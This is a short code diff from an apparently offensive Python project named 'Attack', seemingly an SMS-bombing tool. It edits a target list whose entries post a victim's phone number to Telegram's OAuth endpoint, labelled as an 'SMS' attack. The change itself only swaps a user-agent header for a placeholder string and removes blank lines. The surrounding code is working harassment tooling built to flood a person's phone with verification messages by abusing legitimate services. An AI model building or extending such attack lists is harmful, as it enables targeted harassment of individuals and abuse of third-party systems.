@@ -2,8 +2,6 @@ from Attack.Tools.User_Agent import user_agent
 from Attack.Tools.Email import email
 from Attack.Tools.Username import username
 
-
-
 def urls(number):
     return [
         {
@@ -2165,9 +2163,10 @@ def urls(number):
             'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
             'method': 'post',
             'url': 'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
-            'headers': user_agent()[0],
+            'headers': "$data_useragent",
             'data': {'phone': number},
         },
+
         {
             'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Oauth.Telegram.org', 'anonymous': 'No'},
             'method': 'post',
